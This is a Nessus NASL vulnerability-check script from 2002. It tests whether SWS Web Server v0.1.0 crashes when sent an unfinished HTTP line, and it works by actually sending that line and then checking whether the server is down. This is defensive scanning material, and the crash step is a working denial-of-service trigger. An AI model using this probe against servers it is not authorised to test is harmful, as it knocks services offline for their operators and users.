#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
#
# Modifications by rd:
#
#	- Removed the numerous (and slow) calls to send() and recv()
#	  because the original exploit states that sending just one
#	  request will crash the server
#
########################
# References:
########################
#
# Message-Id: <200209021802.g82I2Vd48012@mailserver4.hushmail.com>
# Date: Mon, 2 Sep 2002 11:02:31 -0700
# To: vulnwatch@vulnwatch.org
# From: saman@hush.com
# Subject: [VulnWatch] SWS Web Server v0.1.0 Exploit
#
########################
#
# Vulnerables:
# SWS Web Server v0.1.0
#

if(description)
{
 script_id(11171);
 script_bugtraq_id(5664);
 script_version("$Revision: 1.10 $");
 
 name["english"] = "HTTP unfinished line denial";
 script_name(english:name["english"]);
 
 desc["english"] = "
We could crash the remote web server by sending an unfinished line.
(ie: |Nessus| without a return carriage at the end of the line).

A cracker may exploit this flaw to disable this service.


Risk factor : High
Solution : Upgrade your web server";

 script_description(english:desc["english"]);
 
 summary["english"] = "SWS web server crashes when unfinished line is sent";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);
soc = http_open_socket(port);
if (!soc) exit(0);
send(socket:soc, data:"|Nessus|");
http_close_socket(soc);
if(http_is_dead(port:port, retry:3))security_hole(port);
